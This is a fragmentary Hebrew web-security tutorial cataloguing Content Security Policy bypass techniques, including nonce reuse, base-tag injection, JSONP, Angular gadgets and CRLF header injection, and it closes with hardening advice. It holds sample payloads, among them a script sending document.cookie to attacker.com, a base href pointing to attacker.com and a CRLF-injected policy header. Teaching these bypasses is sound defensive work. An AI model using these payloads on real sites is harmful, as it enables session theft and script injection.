...
הheader CSP נשלחת כ-HTTP Header:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'
```

![תרשים המראה כיצד הדפדפן מחליט אם להריץ סקריפט תחת CSP: הסקריפט רץ אם ה-nonce תואם או שהמקור מורשה, אחרת הוא נחסם ונשלח דיווח](../../../images/illustrations/webadv-4-1-csp-decision.svg)
...
<!-- Attacker's injection with the same nonce -->
<script nonce="abc123">
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

מצב נוסף - כאשר ה-nonce נחשף בתגובת השרת ואפשר לקרוא אותו דרך injection:

```javascript
// If we have an injection point that allows reading the DOM
...
## הBypass 2: חוסר base-uri - injection תגית base
...
![תרשים המראה כיצד הזרקת תגית base מפנה טעינת סקריפט יחסי לשרת התוקף כשאין הגבלת base-uri, ומונעת כשה-base-uri מוגבל](../../../images/illustrations/webadv-4-1-base-uri-bypass.svg)

---

## הBypass 3: נקודות קצה JSONP על דומיינים מורשים
...
<!-- Various domains with JSONP -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
```

---

## הBypass 4: bypass דרך פריימוורקים - Angular/Vue/React
...
הbypass עם גרסאות ישנות של Angular:
...
// via setTimeout/setInterval with a string
...
## הBypass 6: bypass strict-dynamic
...
הbypass נוספת - exploit script elements שכבר קיימים בדף:

```javascript
// if there is an injection that allows controlling the src of a dynamically loaded script
...
```html
<base href="https://attacker.com/">
<!-- Scripts loaded dynamically with a relative path will come from the attacker -->
```

---

## הBypass 7: injection מדיניות דרך CRLF או פרמטרים

כאשר ניתן להזריק תווי CRLF לתוך header HTTP:

```
GET /page?lang=en%0d%0aContent-Security-Policy:%20script-src%20'unsafe-inline' HTTP/1.1
```

זה יכול ליצור header CSP חדשה שתדרוס את הקיימת. הinjection פרמטרים למדיניות:
...
## הBypass 8: אחסון סקריפטים על CDN מורשה
...
```html
<!-- jsdelivr allows loading files directly from GitHub/npm -->
...
## הBypass 9: שימוש באלמנטים SVG להרצת סקריפטים
...
הbypass מתקדמת יותר עם SVG ו-use:
...
## הBypass 10: שימוש ב-Object ו-Embed
...
## טבלת bypasses מרוכזת

| מדיניות | חולשה | הbypass |
|---------|-------|-------|
| `script-src 'nonce-static'` | nonce קבוע | שימוש חוזר ב-nonce |
| ללא `base-uri` | אין הגבלה על base | הinjection `<base href>` |
...
| CSP דרך HTTP | CRLF injection | הinjection header CSP חדשה |
...
- הפעלת דיווח כדי לזהות ניסיונות bypass
...
הbypass CSP היא אחד התחומים המרכזיים בתקיפות צד לקוח מתקדמות. הבנת המנגנון לעומק מאפשרת לזהות חולשות במדיניות ולנצל אותן. CSP חזק דורש תשומת לב לכל ההנחיות, לא רק ל-script-src. ככל שהמדיניות יותר מצמצמת ומדויקת, כך היא קשה יותר לbypass.
